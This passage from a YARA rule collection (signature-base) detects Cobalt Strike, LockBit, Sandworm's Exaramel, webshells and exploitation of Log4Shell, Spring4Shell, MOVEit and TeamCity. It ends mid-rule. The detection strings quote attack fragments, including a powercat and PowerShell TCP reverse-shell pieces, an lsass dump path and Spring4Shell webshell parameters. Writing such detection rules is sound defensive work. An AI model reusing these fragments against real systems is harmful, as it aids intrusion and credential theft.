rule SIGNATURE_BASE_Cobaltstrike_Unmodifed_Beacon_2
{
	meta:
		description = "Detects unmodified CobaltStrike beacon DLL"
		author = "yara@s3c.za.net"
		id = "8eeb03f9-9698-5a46-b45b-224d5c3f3df7"
		date = "2019-08-16"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike_evasive.yar#L309-L320"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "10114a431fb70be8e18e67b22aa76bf2c0536f07d373f717c1dc51755e0847c9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$loader_export = "ReflectiveLoader"
		$exportname = "beacon.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_Strings_2
{
	meta:
		description = "Identifies strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "af558aa2-a3dc-5a7a-bc74-42bb2246091c"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike.yar#L54-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "4349a7ad94df2269217b55c2aef9628c4eef078566c276936accdd4f996ba2cf"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		$s2 = "Started service %s on %s"
		$s3 = "%s as %s\\%s: %d"

	condition:
		2 of them
}

rule SIGNATURE_BASE_HKTL_Cobaltstrike_Beacon_XOR_Strings_2
{
	meta:
		description = "Identifies XOR'd strings used in Cobalt Strike Beacon DLL"
		author = "Elastic"
		id = "359160a8-cf1c-58a8-bf7f-c09a8d661308"
		date = "2021-03-16"
		modified = "2023-12-05"
		reference = "https://www.elastic.co/blog/detecting-cobalt-strike-with-memory-signatures"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_cobaltstrike.yar#L69-L88"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "b5009c29055784ce6371100417b862f723d7e3c1b4081c563fcd8770db48051f"
		score = 75
		quality = 85
		tags = ""
		xor_s1 = "%02d/%02d/%02d %02d:%02d:%02d"
		xor_s2 = "Started service %s on %s"
		xor_s3 = "%s as %s\\%s: %d"

	strings:
		$s1 = "%02d/%02d/%02d %02d:%02d:%02d" xor(0x01-0xff)
		$s2 = "Started service %s on %s" xor(0x01-0xff)
		$s3 = "%s as %s\\%s: %d" xor(0x01-0xff)
		$fp1 = "MalwareRemovalTool"

	condition:
		2 of ( $s* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_APT_SUSP_NK_3CX_Malicious_Samples_Mar23_1_2
{
	meta:
		description = "Detects indicator (event name) found in samples related to 3CX compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "b233846a-19df-579b-a674-233d66824008"
		date = "2023-03-30"
		modified = "2023-12-05"
		reference = "https://www.sentinelone.com/blog/smoothoperator-ongoing-campaign-trojanizes-3cx-software-in-software-supply-chain-attack/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_mal_3cx_compromise_mar23.yar#L216-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "6ab8a4ac184eaba6eb56bfc49d6fa03f9b0877d75294aa9a242e9ac96482fab0"
		score = 70
		quality = 85
		tags = ""
		hash1 = "7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896"
		hash2 = "59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983"
		hash3 = "aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868"
		hash4 = "c485674ee63ec8d4e8fde9800788175a8b02d3f9416d0e763360fff7f8eb4e02"

	strings:
		$a1 = "AVMonitorRefreshEvent" wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_EXPL_Manageengine_CVE_2022_47966_Jan23_1_2
{
	meta:
		description = "Detects indicators of exploitation of ManageEngine vulnerability as described by Horizon3"
		author = "Florian Roth (Nextron Systems)"
		id = "07535b9c-8611-5a46-bcd7-f94070de2aea"
		date = "2023-01-13"
		modified = "2023-12-05"
		reference = "https://www.horizon3.ai/manageengine-cve-2022-47966-iocs/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_manageengine_jan23.yar#L2-L14"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a62064e4f12632ba6c14cbbd9369ee919536334f19021a177c126b5dff7e568c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "]: com.adventnet.authentication.saml.SamlException: Signature validation failed. SAML Response rejected|"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Jdniexploit_Error_Indicators_Dec21_1_2
{
	meta:
		description = "Detects error messages related to JDNI usage in log files that can indicate a Log4Shell / Log4j exploitation"
		author = "Florian Roth (Nextron Systems)"
		id = "68bcf043-58b4-54a9-b024-64871b5d535f"
		date = "2021-12-10"
		modified = "2023-06-23"
		reference = "https://twitter.com/marcioalm/status/1470361495405875200?s=20"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_log4j_cve_2021_44228.yar#L213-L226"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2ab98814b2ed66b0bda875fecc0b09db82035d7edcdb0af65f815817ec8c6cc8"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "FATAL log4j - Message: BadAttributeValueException: "

	condition:
		1 of them
}

rule SIGNATURE_BASE_EXPL_POC_Springcore_0Day_Indicators_Mar22_1_2
{
	meta:
		description = "Detects indicators found after SpringCore exploitation attempts and in the POC script"
		author = "Florian Roth (Nextron Systems)"
		id = "297e4b57-f831-56e0-a391-1ffbc9a4d438"
		date = "2022-03-30"
		modified = "2023-12-05"
		reference = "https://twitter.com/vxunderground/status/1509170582469943303"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_spring4shell.yar#L19-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "39fb62ec7953dae0a88e39e73e3ff286fc19cb8f21f8feb869a1875f6ba70cfb"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di"
		$x2 = "?pwd=j&cmd=whoami"
		$x3 = ".getParameter(%22pwd%22)"
		$x4 = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7B"

	condition:
		1 of them
}

rule SIGNATURE_BASE_SUSP_Email_Redirection_Spoofing_Feb25_2
{
	meta:
		description = "Detects redirect spoofing in embedded URLs. This technique is used by threat actors to obscure the actual destination of a link"
		author = "Jonathan Peters (cod3nym)"
		id = "bf3a2b06-4dc5-5f0f-bf1f-2bd6a1cc4a8d"
		date = "2025-02-20"
		modified = "2025-03-20"
		reference = "https://any.run/cybersecurity-blog/cyber-attacks-january-2025/#fake-youtube-links-redirect-users-to-phishing-pages-11298"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/susp_email_redirection_spoofing.yar#L1-L19"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "9b196220b369c199a7e4d57cb5db18b32eb2565a6f9190929c5c01ac4fa04ac8"
		hash = "c4eb35c1a1c10226bff9bb0c88ca516441208d193b4994eeb292a66e53a2cc04"
		hash = "e3b8ea03a472348814c6ac81088234836e627a1878ec36e46ce62526e1390935"
		logic_hash = "9a411317821751dc0873fe3163791115d1e19bc4d57119ed2ba513b444864032"
		score = 70
		quality = 85
		tags = ""

	strings:
		$sa1 = "Content-Transfer-Encoding:" ascii
		$sa2 = "Subject:" ascii
		$x = ".com%20%20%20%20%20%" ascii

	condition:
		all of them
}

rule SIGNATURE_BASE_Cobaltgang_PDF_Metadata_Rev_A_2
{
	meta:
		description = "Find documents saved from the same potential Cobalt Gang PDF template"
		author = "Palo Alto Networks Unit 42"
		id = "bcf5bf6e-c786-5f78-bf58-e0631a17e62e"
		date = "2018-10-25"
		modified = "2023-12-05"
		reference = "https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/crime_cobalt_gang_pdf.yar#L1-L12"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8020ccff761b49d98e18cd5cb3c0695956a88e86a0958bfba1a19b7e3e629bb9"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ = "<xmpMM:DocumentID>uuid:31ac3688-619c-4fd4-8e3f-e59d0354a338" ascii wide

	condition:
		any of them
}

rule SIGNATURE_BASE_APT_HAFNIUM_Forensic_Artefacts_Mar21_1_2
{
	meta:
		description = "Detects forensic artefacts found in HAFNIUM intrusions"
		author = "Florian Roth (Nextron Systems)"
		id = "872822b0-34d9-5ae4-a532-6a8786494fa9"
		date = "2021-03-02"
		modified = "2023-12-05"
		reference = "https://www.microsoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-servers/"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_hafnium.yar#L35-L48"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "eb86595956092506c2e29373faaf39a3987f9feed36a53b191bedd498db05cbb"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "lsass.exe C:\\windows\\temp\\lsass" ascii wide fullword
		$s2 = "c:\\ProgramData\\it.zip" ascii wide fullword
		$s3 = "powercat.ps1'); powercat -c" ascii wide fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_HKTL_Nishang_PS1_Invoke_Powershelltcponeline_2
{
	meta:
		description = "Detects PowerShell Oneliner in Nishang's repository"
		author = "Florian Roth (Nextron Systems)"
		id = "0218ebbd-2dbe-5838-ab53-1e78e3f97b9e"
		date = "2021-03-03"
		modified = "2023-12-05"
		reference = "https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_hafnium.yar#L105-L119"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "59622bff95de1077d26ee4547f37cd1045c0c1fc6817df40ff2564b33a962a07"
		score = 75
		quality = 85
		tags = ""
		hash1 = "2f4c948974da341412ab742e14d8cdd33c1efa22b90135fcfae891f08494ac32"

	strings:
		$s1 = "=([text.encoding]::ASCII).GetBytes((iex $" ascii wide
		$s2 = ".GetStream();[byte[]]$" ascii wide
		$s3 = "New-Object Net.Sockets.TCPClient('" ascii wide

	condition:
		all of them
}

rule SIGNATURE_BASE_WEBSHELL_Proxyshell_Exploitation_Nov21_1_2
{
	meta:
		description = "Detects webshells dropped by DropHell malware"
		author = "Florian Roth (Nextron Systems)"
		id = "300eaadf-db0c-5591-84fc-abdf7cdd90c1"
		date = "2021-11-01"
		modified = "2025-03-21"
		reference = "https://www.deepinstinct.com/blog/do-not-exchange-it-has-a-shell-inside"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_proxyshell.yar#L252-L266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d9812d3f53c346c4e318609e0c7de66811b27ffa7528a6ddeb6ac8436da59ef5"
		score = 85
		quality = 85
		tags = ""

	strings:
		$s01 = ".LoadXml(System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(Request[" ascii wide
		$s02 = "new System.IO.MemoryStream()" ascii wide
		$s03 = "Transform(" ascii wide

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Apr23_1_2
{
	meta:
		description = "Detects indicators found in LockBit ransomware"
		author = "Florian Roth"
		id = "75dc8b95-16f0-5170-a7d6-fc10bb778348"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_lockbit_lnx_macos_apr23.yar#L43-L67"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "cd5bffa5571abfd1446b065d26c8c23f00fe1376d505af539c6f37356014a86f"
		score = 75
		quality = 85
		tags = ""

	strings:
		$xe1 = "-i '/path/to/crypt'" xor
		$xe2 = "http://lockbit" xor
		$s1 = "idelayinmin" ascii
		$s2 = "bVMDKmode" ascii
		$s3 = "bSelfRemove" ascii
		$s4 = "iSpotMaximum" ascii
		$fp1 = "<html"

	condition:
		(1 of ( $x* ) or 4 of them ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_MAL_RANSOM_Lockbit_Locker_LOG_Apr23_1_2
{
	meta:
		description = "Detects indicators found in LockBit ransomware log files"
		author = "Florian Roth"
		id = "aa0a2393-e5a2-5151-8afb-91a9bb922179"
		date = "2023-04-17"
		modified = "2023-12-05"
		reference = "https://objective-see.org/blog/blog_0x75.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_lockbit_lnx_macos_apr23.yar#L69-L84"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d5f96e601150209382d3f6458863bc79768beb99b587aa8d9ba37cb2c11ef634"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = " is encrypted. Checksum after encryption "
		$s2 = "~~~~~Hardware~~~~"
		$s3 = "[+] Add directory to encrypt:"
		$s4 = "][+] Launch parameters: "

	condition:
		2 of them
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_1_2
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "a7c521b8-c654-51dd-9d5b-4ba883feffe3"
		date = "2023-06-01"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L43-L56"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "26674d8dea5cb2e95e442c4c75d80ca610f7373f0b216c0b1c83a5b1f9f70316"
		score = 70
		quality = 85
		tags = ""

	strings:
		$x1 = "POST /moveitisapi/moveitisapi.dll action=m2 " ascii
		$x2 = " GET /human2.aspx - 443 " ascii

	condition:
		1 of them
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_2_2
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit Transfer logs"
		author = "Florian Roth"
		id = "1527f5e3-071d-5152-9452-9c4472d258f2"
		date = "2023-06-03"
		modified = "2023-12-05"
		reference = "https://www.huntress.com/blog/moveit-transfer-critical-vulnerability-rapid-response"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L58-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "56328d078801a702ad47f01f356df6f00be8da593d03c549e77312af9b47b5be"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.102+Safari/537.36" ascii
		$a2 = "Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Chrome/105.0.5195.54+Safari/537.36" ascii
		$s1 = " POST /moveitisapi/moveitisapi.dll" ascii
		$s2 = " POST /guestaccess.aspx"
		$s3 = " POST /api/v1/folders/"
		$s4 = "/files uploadType=resumable&"
		$s5 = " action=m2 "

	condition:
		1 of ( $a* ) and 3 of ( $s* ) or all of ( $s* )
}

rule SIGNATURE_BASE_LOG_EXPL_Moveit_Exploitation_Indicator_Jun23_3_2
{
	meta:
		description = "Detects a potential compromise indicator found in MOVEit DMZ Web API logs"
		author = "Nasreddine Bencherchali"
		id = "113a501f-d9ed-51fd-82cd-ccb6f02833bd"
		date = "2023-06-13"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/vuln_moveit_0day_jun23.yar#L81-L94"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2eaa06c31687c6368f036a705fdc1b1c42355f19c098ae764a998039cc4aebb5"
		score = 70
		quality = 85
		tags = ""

	strings:
		$s1 = "TargetInvocationException" ascii
		$s2 = "MOVEit.DMZ.Application.Folders.ResumableUploadFilePartHandler.DeserializeFileUploadStream" ascii

	condition:
		all of ( $s* )
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Ziparchivefile_2
{
	meta:
		description = "Detects an archive file created by P.A.S. for download operation"
		author = "FR/ANSSI/SDO (modified by Florian Roth)"
		id = "081cc65b-e51c-59fc-a518-cd986e8ee2f7"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L30-L42"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c15e7022f45ec211ba635d6cd31bab16f4fb0d3038fb19d5765e0f751c14a826"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "Archive created by P.A.S. v."

	condition:
		$s1
}

rule SIGNATURE_BASE_WEBSHELL_PAS_Webshell_Sqldumpfile_2
{
	meta:
		description = "Detects SQL dump file created by P.A.S. webshell"
		author = "FR/ANSSI/SDO"
		id = "4c26feeb-3031-5c91-9eeb-4b5fe9702e39"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L64-L76"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "c34abcada22fdf462fd66cc2da18ab9e54215defc6f7a7a95b5a80d1155a2ffe"
		score = 90
		quality = 85
		tags = ""

	strings:
		$ = "-- [ SQL Dump created by P.A.S. ] --"

	condition:
		1 of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Key_2
{
	meta:
		description = "Detects the encryption key for the configuration file used by Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "8078de62-3dd2-5ee0-8bda-f508e4013144"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L78-L90"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "056503a2c240a641cd2292a30ab1090e3a358cb4d57dca83b836ecb1bc62ed6b"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "odhyrfjcnfkdtslt"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Configuration_Name_Encrypted_2
{
	meta:
		description = "Detects the specific name of the configuration file in Exaramel malware as seen in sample e1ff72[...]"
		author = "FR/ANSSI/SDO"
		id = "1c06f5fc-3435-51cd-92fb-17a4ab6b63ad"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L92-L104"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "f65d59381403534a2c2f39d66c7c62bf1540eafc9aad1ad73de1809e91c42446"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "configtx.json"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Socket_Path_2
{
	meta:
		description = "Detects path of the unix socket created to prevent concurrent executions in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "3aab84c9-9748-5d11-9cd7-efa9151036cf"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L134-L146"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "8c049b5a7b508ca0f160d166f3c726e4a23a2c5b3105d075d7bf7a301a1c58f6"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "/tmp/.applocktx"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Task_Names_2
{
	meta:
		description = "Detects names of the tasks received from the CC server in Exaramel malware"
		author = "FR/ANSSI/SDO"
		id = "185f2f3b-bf5c-54af-bca2-400d08bf9c91"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L148-L167"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "193482da1e2b9509fa9c65d46edc56057f7b5d44b7408d918d4a9cbb60736dab"
		score = 80
		quality = 85
		tags = ""

	strings:
		$ = "App.Delete"
		$ = "App.SetServer"
		$ = "App.SetProxy"
		$ = "App.SetTimeout"
		$ = "App.Update"
		$ = "IO.ReadFile"
		$ = "IO.WriteFile"
		$ = "OS.ShellExecute"

	condition:
		all of them
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings_Typo_2
{
	meta:
		description = "Detects misc strings in Exaramel malware with typos"
		author = "FR/ANSSI/SDO"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L187-L202"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "65e6de743eb9fc742674c7e54eef8a376963a6fd4380bacd03fe6f92d4235920"
		score = 80
		quality = 85
		tags = ""

	strings:
		$typo1 = "/sbin/init | awk "
		$typo2 = "Syslog service for monitoring \n"
		$typo3 = "Error.Can't update app! Not enough update archive."
		$typo4 = ":\"metod\""

	condition:
		3 of ( $typo* )
}

rule SIGNATURE_BASE_APT_MAL_Sandworm_Exaramel_Strings_2
{
	meta:
		description = "Detects Strings used by Exaramel malware"
		author = "FR/ANSSI/SDO (composed from 4 saparate rules by Florian Roth)"
		id = "fdc79b87-eb9e-5751-9474-ff653b073165"
		date = "2021-02-15"
		modified = "2024-05-25"
		reference = "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-005.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_sandworm_centreon.yar#L204-L232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "9d2790e60184ed973b2735263d0a997f32af0beacc9ea8ef65926fe6507011d5"
		score = 80
		quality = 85
		tags = ""

	strings:
		$persistence1 = "systemd"
		$persistence2 = "upstart"
		$persistence3 = "systemV"
		$persistence4 = "freebsd rc"
		$report1 = "systemdupdate.rep"
		$report2 = "upstartupdate.rep"
		$report3 = "remove.rep"
		$url1 = "/tasks.get/"
		$url2 = "/time.get/"
		$url3 = "/time.set"
		$url4 = "/tasks.report"
		$url5 = "/attachment.get/"
		$url6 = "/auth/app"

	condition:
		(5 of ( $url* ) and all of ( $persistence* ) ) or ( all of ( $persistence* ) and all of ( $report* ) ) or ( 5 of ( $url* ) and all of ( $report* ) )
}

rule SIGNATURE_BASE_LOG_EXPL_SUSP_Teamcity_Oct23_1_2
{
	meta:
		description = "Detects log entries that could indicate a successful exploitation of TeamCity servers"
		author = "Florian Roth"
		id = "4845b40a-cf77-53ae-b2fa-d1ed861153f2"
		date = "2023-10-02"
		modified = "2023-12-05"
		reference = "https://attackerkb.com/topics/1XEEEkGHzt/cve-2023-42793/rapid7-analysis"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/expl_teamcity_2023_42793.yar#L20-L34"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "a2f0abffb9c72e6b32875310e5af7365b6cab4e6c4f6188daa3085b57c38ed0e"
		score = 70
		quality = 85
		tags = ""

	strings:
		$a1 = "tbrains.buildServer.ACTIVITIES"
		$s1 = "External process is launched by user user with id"
		$s2 = ". Command line: cmd.exe \"/c whoami"

	condition:
		all of them
}

rule SIGNATURE_BASE_HKTL_FRP_Apr20_1_2
{
	meta:
		description = "Detects FRP fast reverse proxy tool often used by threat groups"
		author = "Florian Roth (Nextron Systems)"
		id = "55483832-0e0b-5c28-8be5-dbd14ddb50e3"
		date = "2020-04-07"
		modified = "2022-11-03"
		reference = "https://github.com/fatedier/frp"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_frp_proxy.yar#L2-L22"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "21f91fd99aed8b62d804504889c41ca77567fd345cf4ea0ef00161eefa9324a7"
		score = 70
		quality = 85
		tags = ""
		hash1 = "05537c1c4e29db76a24320fb7cb80b189860389cdb16a9dbeb0c8d30d9b37006"
		hash2 = "08c685c8febb5385f7548c2a64a27bae7123a937c5af958ebc08a3accb29978d"

	strings:
		$x1 = "frp/vendor/github.com/spf13/" ascii
		$x2 = "github.com/fatedier/frp/vendor/" ascii
		$fpg2 = "<html"
		$fpg3 = "<HTML"
		$fpg6 = "<?xml"

	condition:
		1 of ( $x* ) and not 1 of ( $fp* )
}

rule SIGNATURE_BASE_HKTL_Powerkatz_Feb19_1_2
{
	meta:
		description = "Detetcs a tool used in the Australian Parliament House network compromise"
		author = "Florian Roth (Nextron Systems)"
		id = "294d6f6c-dbc8-5431-87a0-64abe582c4ea"
		date = "2019-02-18"
		modified = "2023-12-05"
		reference = "https://twitter.com/cyb3rops/status/1097423665472376832"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_aus_parl_compromise.yar#L137-L152"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "d1d39d68c5c5a3f6142a966925e2a136e937bc09abddd4080862346683886455"
		score = 75
		quality = 85
		tags = ""

	strings:
		$x1 = "Powerkatz32" ascii wide fullword
		$x2 = "Powerkatz64" ascii wide
		$s1 = "GetData: not found taskName" fullword ascii wide
		$s2 = "GetRes Ex:" fullword ascii wide

	condition:
		1 of ( $x* ) and 1 of ( $s* )
}

rule SIGNATURE_BASE_MAL_Github_Repo_Compromise_Myjino_Ru_Aug22_2
{
	meta:
		description = "Detects URL mentioned in report on compromised Github repositories in August 2022"
		author = "Florian Roth (Nextron Systems)"
		id = "1eaabad5-d0de-5d17-a5fa-3c638354843d"
		date = "2022-08-03"
		modified = "2023-12-05"
		reference = "https://twitter.com/stephenlacy/status/1554697077430505473"
